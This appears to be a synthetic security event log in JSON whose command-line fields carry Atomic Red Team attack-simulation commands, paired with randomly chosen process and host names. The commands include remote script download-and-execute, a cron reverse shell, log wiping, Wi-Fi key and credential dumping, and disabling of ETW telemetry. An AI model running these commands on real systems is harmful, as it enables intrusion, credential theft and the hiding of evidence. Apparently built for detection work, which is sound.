    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-38.davis-powell.net",
        "User": "markclark",
        "ProcessID": 2688,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"# Extract line with IP address from the syslog configuration output\\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\\\\..\\\\atomics\\\\T1560.001\\\\src\\\\esxi_get_loghost.txt | findstr /r \\\"[0-9]*\\\\.[0-9]*\\\\.[0-9]*\\\\.\\\" > c:\\\\temp\\\\loghost.txt\\n\\n# Replace the IP with \\\"0\\\"\\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\\\\..\\\\atomics\\\\T1560.001\\\\src\\\\esxi_remove_loghost.txt\\n\\n# Extract the IP from the line extracted from findstr\\n$inputFilePath = \\\"c:\\\\temp\\\\loghost.txt\\\"\\n$outputFilePath = \\\"c:\\\\temp\\\\loghost_ip.txt\\\"\\n\\n$fileContent = Get-Content -Path $inputFilePath -Raw\\n\\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\\n    Write-Host \\\"The content is $fileContent\\\"\\n    Write-Host \\\"The file is empty\\\"\\n} else {\\n    # Use a regular expression to extract IP addresses\\n    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\\\/\\\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\\n    \\n    $output = \\\"esxcli system syslog config set --loghost=\\\" + $ipAddresses\\n\\n    $output | Out-File -FilePath $outputFilePath -Encoding ascii\\n    \\n    Write-Host \\\"IP addresses extracted and saved to $outputFilePath\\\"\\n}\\n\",",
        "LogonID": 926145,
        "LogonGuid": "c8f20732-9fd7-427e-98e7-9aa916833729",
        "SourceProcessID": 4218,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\whatever..exe",
        "DestinationProcessID": 2167,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\star..dll",
        "UtcTime": "2024-05-17T01:36:51.619008Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-62.taylor.com",
        "User": "leahramos",
        "ProcessID": 8401,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"export ART='echo \\\"Atomic Red Team was here... T1059.004\\\"'\\necho $ART |/bin/sh\\n\",",
        "LogonID": 873773,
        "LogonGuid": "1b8dfc36-ea06-4457-81b7-a091724b1fec",
        "SourceProcessID": 5359,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\organization..dll",
        "DestinationProcessID": 7957,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\hundred..exe",
        "UtcTime": "2024-05-17T01:36:51.619008Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-28.wise.com",
        "User": "winterswilliam",
        "ProcessID": 8993,
        "ProcessName": "malware.exe",
        "CommandLine": "\"cat /etc/login.defs\\n\",",
        "LogonID": 621067,
        "LogonGuid": "6e921624-2cef-406f-851c-69eb5f33beca",
        "SourceProcessID": 5694,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\watch..exe",
        "DestinationProcessID": 4922,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\land..dll",
        "UtcTime": "2024-05-17T01:36:51.619008Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-59.hill.com",
        "User": "nicolemoore",
        "ProcessID": 1885,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\csc.exe /r:System.EnterpriseServices.dll /out:\\\"#{output_file}\\\" /target:library \\\"#{source_file}\\\"\\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\regasm.exe /U #{output_file}\\n\",",
        "LogonID": 140094,
        "LogonGuid": "21f530b3-f711-4d58-bfa6-5cadc480593a",
        "SourceProcessID": 5507,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\standard..exe",
        "DestinationProcessID": 6047,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\evening..exe",
        "UtcTime": "2024-05-17T01:36:51.619008Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-18.gordon.info",
        "User": "erinmarshall",
        "ProcessID": 2794,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"echo \\\"#{message}\\\" > \\\"#{file_contents_path}\\\" & type \\\"#{file_contents_path}\\\"\\n\",",
        "LogonID": 584238,
        "LogonGuid": "615795dd-3fc4-4602-970e-e00bc269f6a2",
        "SourceProcessID": 8898,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\the..exe",
        "DestinationProcessID": 8714,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\vote..exe",
        "UtcTime": "2024-05-17T01:36:51.620010Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-44.costa.com",
        "User": "kathylopez",
        "ProcessID": 6335,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"cat /etc/passwd > #{output_file}\\ncat #{output_file}\\n\",",
        "LogonID": 786683,
        "LogonGuid": "fc7a66fb-4b7f-42ac-887f-a2da3c809afd",
        "SourceProcessID": 8626,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\couple..exe",
        "DestinationProcessID": 8167,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\less..exe",
        "UtcTime": "2024-05-17T01:36:51.620010Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-48.lane.com",
        "User": "christine39",
        "ProcessID": 1052,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"wscript.exe \\\"#{vbscript_file}\\\"\\n\",",
        "LogonID": 753502,
        "LogonGuid": "bd3b8c03-7ab5-4739-b362-d5db08340619",
        "SourceProcessID": 9413,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\range..exe",
        "DestinationProcessID": 3866,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\wind..exe",
        "UtcTime": "2024-05-17T01:36:51.620010Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-47.adams.biz",
        "User": "michael74",
        "ProcessID": 1527,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$file = Get-Item $env:temp\\\\T1564.001-10.txt -Force\\n$file.attributes='System'\\n\",",
        "LogonID": 520989,
        "LogonGuid": "624e1e27-873d-40e1-bc7c-3b736d3da447",
        "SourceProcessID": 7079,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\daughter..exe",
        "DestinationProcessID": 2003,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\back..dll",
        "UtcTime": "2024-05-17T01:36:51.620010Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-39.dawson.com",
        "User": "wjackson",
        "ProcessID": 6574,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nsensitivefiles -noninteractive -consoleoutput\",",
        "LogonID": 904426,
        "LogonGuid": "a26edf4a-08e1-40e1-991a-3c9294cefc7a",
        "SourceProcessID": 6345,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\modern..dll",
        "DestinationProcessID": 2773,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\what..dll",
        "UtcTime": "2024-05-17T01:36:51.621009Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-41.cole.com",
        "User": "tiffany67",
        "ProcessID": 1152,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"cat /dev/null > /var/log/messages #truncating the file to zero bytes\\ncat /dev/zero > /var/lol/messages #log file filled with null bytes(zeros)\\n\",",
        "LogonID": 830175,
        "LogonGuid": "dab4e6a3-342a-440d-9b75-33f21f561083",
        "SourceProcessID": 7721,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\add..dll",
        "DestinationProcessID": 6895,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\prove..exe",
        "UtcTime": "2024-05-17T01:36:51.621009Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-99.roberts.com",
        "User": "devin30",
        "ProcessID": 4645,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Copy \\\"PathToAtomicsFolder\\\\T1137.006\\\\bin\\\\Addins\\\\ExcelVBAaddin.xlam\\\" \\\"$env:APPDATA\\\\Microsoft\\\\Excel\\\\XLSTART\\\\notepad.xlam\\\"        \\nStart-Process \\\"Excel\\\"\\n\",",
        "LogonID": 687186,
        "LogonGuid": "c308458f-e7de-4942-968c-5857883fc256",
        "SourceProcessID": 5806,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\human..exe",
        "DestinationProcessID": 5594,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\official..exe",
        "UtcTime": "2024-05-17T01:36:51.621009Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-48.figueroa.net",
        "User": "daniel45",
        "ProcessID": 2075,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" -f (objectcategory=person) #{optional_args}\\n\",",
        "LogonID": 183610,
        "LogonGuid": "76fee2b9-0f11-4e4c-bc5c-ce0ddaef39da",
        "SourceProcessID": 2795,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\image..dll",
        "DestinationProcessID": 9285,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\tough..exe",
        "UtcTime": "2024-05-17T01:36:51.621009Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-09.hurst.info",
        "User": "matthewcoleman",
        "ProcessID": 7398,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing) \\nInvoke-MalDoc -macroFile \\\"PathToAtomicsFolder\\\\T1053.005\\\\src\\\\T1053.005-macrocode.txt\\\" -officeProduct \\\"#{ms_product}\\\" -sub \\\"Scheduler\\\"\\n\",",
        "LogonID": 989397,
        "LogonGuid": "a8efe074-8dd3-43b1-9d44-2cd286c6a986",
        "SourceProcessID": 3689,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\issue..dll",
        "DestinationProcessID": 2531,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\stock..exe",
        "UtcTime": "2024-05-17T01:36:51.622007Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-56.clark-vazquez.biz",
        "User": "lwest",
        "ProcessID": 1754,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\\n. \\\"#{test_harness}\\\"\\n\\n$InstallerAssemblyDir = \\\"#{assembly_dir}\\\"\\n$InstallerAssemblyFileName = \\\"#{assembly_filename}\\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\\"/? `\\\"$InstallerAssemblyFullPath`\\\"\\\"\\n$ExpectedOutput = 'Constructor_HelpText_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\\"\\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\\"@\\n}\\n\",",
        "LogonID": 752226,
        "LogonGuid": "2932b8dc-58b2-4e4a-843f-ad5d20bc8356",
        "SourceProcessID": 9198,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\or..dll",
        "DestinationProcessID": 7178,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\situation..exe",
        "UtcTime": "2024-05-17T01:36:51.622007Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-43.lopez.net",
        "User": "emily78",
        "ProcessID": 8099,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"csrutil status\\n\",",
        "LogonID": 776267,
        "LogonGuid": "6e27743b-6cd6-431a-b071-8925019a8b11",
        "SourceProcessID": 7647,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\experience..exe",
        "DestinationProcessID": 5925,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\produce..exe",
        "UtcTime": "2024-05-17T01:36:51.622007Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-49.martinez.biz",
        "User": "ronaldgonzalez",
        "ProcessID": 4709,
        "ProcessName": "nc.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" -f (objectcategory=group) #{optional_args}\\n\",",
        "LogonID": 649761,
        "LogonGuid": "20cff8b6-2344-46a7-a31b-5dba92189cf5",
        "SourceProcessID": 4149,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\better..dll",
        "DestinationProcessID": 5105,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\there..dll",
        "UtcTime": "2024-05-17T01:36:51.622007Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-18.chapman-dillon.biz",
        "User": "justinkirk",
        "ProcessID": 8548,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"del %TEMP%\\\\PrintBrm.zip >nul 2>&1 \\n#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\\\\PrintBrm.zip -O FORCE\\n\",",
        "LogonID": 977907,
        "LogonGuid": "71449f92-2f8e-4685-9a45-c15579b81e3d",
        "SourceProcessID": 8743,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\people..dll",
        "DestinationProcessID": 6970,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\director..exe",
        "UtcTime": "2024-05-17T01:36:51.622007Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-91.hoover-johnson.com",
        "User": "hernandezmichael",
        "ProcessID": 2633,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"bash -c 'trap \\\"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\\\" SIGINT && kill -SIGINT $$'\\n\",",
        "LogonID": 936969,
        "LogonGuid": "a0c7c648-9cf0-40f8-8845-34344c785aed",
        "SourceProcessID": 9698,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\blood..dll",
        "DestinationProcessID": 5841,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\quality..exe",
        "UtcTime": "2024-05-17T01:36:51.622007Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-13.tucker-miles.com",
        "User": "adam74",
        "ProcessID": 6115,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"sudo truncate -s 0 #{system_log_path} #size parameter shorthand\\nsudo truncate --size=0 #{system_log_path} #size parameter \\n\",",
        "LogonID": 975699,
        "LogonGuid": "9f6f0d26-d572-4c8c-bc12-dae3c803d6d4",
        "SourceProcessID": 9071,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\international..exe",
        "DestinationProcessID": 1862,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\despite..exe",
        "UtcTime": "2024-05-17T01:36:51.622007Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-63.garcia-davis.info",
        "User": "karen77",
        "ProcessID": 3581,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sudo log -f /var/log/system.log | : > /var/log/system.log\\n\",",
        "LogonID": 244668,
        "LogonGuid": "d97d94ae-a8a8-4fbf-bc82-fa1f1c1cc1db",
        "SourceProcessID": 7270,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\change..dll",
        "DestinationProcessID": 1282,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\school..dll",
        "UtcTime": "2024-05-17T01:36:51.622007Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-80.torres-williams.com",
        "User": "brownsamantha",
        "ProcessID": 4772,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\\necho -n \\\"* * * * * root /bin/bash -c '/bin/bash -c echo \\\\\\\"\\\\\\\"; echo \\\\\\\"hello from host! \\\" > #{mount_point}#{cron_path}/#{cron_filename}\\necho -n \\\"$\\\" >> #{mount_point}#{cron_path}/#{cron_filename}\\necho -n \\\"(hostname) \\\" >> #{mount_point}#{cron_path}/#{cron_filename}\\necho -n \\\"$\\\" >> #{mount_point}#{cron_path}/#{cron_filename}\\necho \\\"(id)\\\\\\\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'\\\" >> #{mount_point}#{cron_path}/#{cron_filename}\\nnetcat -l -p #{listen_port} 2>&1\\n\",",
        "LogonID": 685749,
        "LogonGuid": "a62579a5-c8ef-4c37-93cc-da0a4df5e22e",
        "SourceProcessID": 8565,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\Democrat..exe",
        "DestinationProcessID": 6393,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\they..dll",
        "UtcTime": "2024-05-17T01:36:51.623571Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-64.smith.info",
        "User": "rebeccaburns",
        "ProcessID": 5263,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"openssl genrsa -out #{key_filename} 4096\\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \\\"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\\\" -out #{cert_filename}\\ncp #{cert_filename} /usr/local/share/certs/\\ncertctl rehash\\n\",",
        "LogonID": 371796,
        "LogonGuid": "04e8926b-ae51-4dce-8932-26e22bcafc23",
        "SourceProcessID": 1853,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\accept..exe",
        "DestinationProcessID": 2370,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\buy..exe",
        "UtcTime": "2024-05-17T01:36:51.623571Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-70.moore.org",
        "User": "melaniewhite",
        "ProcessID": 4598,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Import-Module \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PowerView.ps1\\\"\\nInvoke-ShareFinder #{parameters}\\n\",",
        "LogonID": 913954,
        "LogonGuid": "d725c4b2-4e15-4ab4-a831-979d1ea6cd29",
        "SourceProcessID": 5521,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\box..exe",
        "DestinationProcessID": 6743,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\build..dll",
        "UtcTime": "2024-05-17T01:36:51.623571Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-28.hernandez.com",
        "User": "lawrence68",
        "ProcessID": 2786,
        "ProcessName": "malware.exe",
        "CommandLine": "\"sudo rm -rf #{syslog_path}\\nif [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi\\n\",",
        "LogonID": 787053,
        "LogonGuid": "94c3d783-db83-431b-915d-bb05c90491d5",
        "SourceProcessID": 3363,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\feeling..exe",
        "DestinationProcessID": 2419,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\next..exe",
        "UtcTime": "2024-05-17T01:36:51.623571Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-49.fletcher.com",
        "User": "nguyendavid",
        "ProcessID": 7111,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"kubectl get cronjobs -n #{namespace}\\n\",",
        "LogonID": 171567,
        "LogonGuid": "3b278a4f-9782-45dd-8751-833169c9a962",
        "SourceProcessID": 6847,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\TV..dll",
        "DestinationProcessID": 3216,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\financial..exe",
        "UtcTime": "2024-05-17T01:36:51.623571Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-46.garza.com",
        "User": "harrisonheather",
        "ProcessID": 8048,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"iptables-save > /tmp/iptables.rules\\niptables -D OUTPUT -p tcp --dport 21 -j DROP\\n\",",
        "LogonID": 848192,
        "LogonGuid": "a17d2762-ffd0-4af6-989c-24572c54d5fe",
        "SourceProcessID": 9815,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\fight..dll",
        "DestinationProcessID": 5288,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\worker..exe",
        "UtcTime": "2024-05-17T01:36:51.624526Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-14.mata.net",
        "User": "blackburnkenneth",
        "ProcessID": 6420,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"icacls \\\"#{path}\\\" /grant Everyone:F /T /C /Q\",",
        "LogonID": 876401,
        "LogonGuid": "f14962a2-3fc9-444b-aff8-51deedd6e353",
        "SourceProcessID": 6002,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\everything..exe",
        "DestinationProcessID": 3174,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\wall..dll",
        "UtcTime": "2024-05-17T01:36:51.624526Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-76.petty.com",
        "User": "christopher83",
        "ProcessID": 8060,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"netsh wlan show profile * key=clear\",",
        "LogonID": 311014,
        "LogonGuid": "7c9585eb-ffcf-4a3b-8f8f-478c7439937b",
        "SourceProcessID": 5680,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\data..exe",
        "DestinationProcessID": 8827,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\it..exe",
        "UtcTime": "2024-05-17T01:36:51.624526Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-09.everett.net",
        "User": "darrell99",
        "ProcessID": 8079,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"ln -sf /dev/null #{history_path}\\n\",",
        "LogonID": 765738,
        "LogonGuid": "5beaa356-6887-455a-8730-26e4f7bca51a",
        "SourceProcessID": 6214,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\sometimes..exe",
        "DestinationProcessID": 1848,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\agency..exe",
        "UtcTime": "2024-05-17T01:36:51.624526Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-97.salazar.com",
        "User": "hernandezbrian",
        "ProcessID": 9037,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$RunKey = \\\"#{reg_key_path}\\\"\\nSet-ItemProperty -Path $RunKey -Name \\\"socks5_powershell\\\" -Value \\\"#{reg_key_value}\\\"\\n\",",
        "LogonID": 188998,
        "LogonGuid": "34997080-4347-447b-bb5d-795c046a2ec8",
        "SourceProcessID": 2226,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\care..exe",
        "DestinationProcessID": 7030,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\protect..exe",
        "UtcTime": "2024-05-17T01:36:51.624526Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-24.taylor.com",
        "User": "walkerdaniel",
        "ProcessID": 4684,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Powershell.exe \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\\\Windows\\\\System32\\\\cmd.exe'\\\"\\n\",",
        "LogonID": 861396,
        "LogonGuid": "52dc6dc4-fd8e-4c20-bf3f-3d59aad60482",
        "SourceProcessID": 1263,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\off..exe",
        "DestinationProcessID": 7887,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\kitchen..dll",
        "UtcTime": "2024-05-17T01:36:51.625521Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-96.wells.com",
        "User": "tara19",
        "ProcessID": 5220,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Get-ADReplAccount -All -Server #{logonserver}\\n\",",
        "LogonID": 581501,
        "LogonGuid": "e40512cc-006c-4076-a392-30b374b45659",
        "SourceProcessID": 9029,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\sure..exe",
        "DestinationProcessID": 8443,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\brother..exe",
        "UtcTime": "2024-05-17T01:36:51.625521Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-76.giles.com",
        "User": "patty95",
        "ProcessID": 4247,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo find /var/log -name '#{system_log_name1}.*' -exec rm {} \\\\; #using \\\"rm\\\" execution\\nsudo find /var/log/ -name \\\"#{system_log_name2}.*\\\" -exec shred -u -z -n 3 {} \\\\; #using \\\"shred\\\" execution\\nsudo find /var/log/ -name \\\"#{system_log_name3}.*\\\" -exec unlink {} \\\\; #using \\\"unlink\\\" execution\\n\",",
        "LogonID": 265664,
        "LogonGuid": "a14567a4-3654-4474-92f5-49440ab5c08a",
        "SourceProcessID": 9163,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\more..dll",
        "DestinationProcessID": 6741,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\production..dll",
        "UtcTime": "2024-05-17T01:36:51.625521Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-55.lambert-little.com",
        "User": "chudson",
        "ProcessID": 2237,
        "ProcessName": "nc.exe",
        "CommandLine": "\"REG ADD HKLM\\\\Software\\\\Microsoft\\\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0\",",
        "LogonID": 139426,
        "LogonGuid": "706c1b7b-9814-4979-a659-f57fb654f979",
        "SourceProcessID": 3486,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\school..exe",
        "DestinationProcessID": 7611,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\natural..dll",
        "UtcTime": "2024-05-17T01:36:51.625521Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-13.taylor-johnson.info",
        "User": "ofields",
        "ProcessID": 6225,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"tcpdump -c 5 -nnni #{interface}\\ntshark -c 5 -i #{interface}\\n\",",
        "LogonID": 292386,
        "LogonGuid": "c09412e7-227d-45b4-808e-a279a6b999a5",
        "SourceProcessID": 5252,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\value..dll",
        "DestinationProcessID": 6666,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\eye..exe",
        "UtcTime": "2024-05-17T01:36:51.625521Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-87.munoz.com",
        "User": "sgonzalez",
        "ProcessID": 9306,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"pktmon.exe filter add -p 445\\n\",",
        "LogonID": 220828,
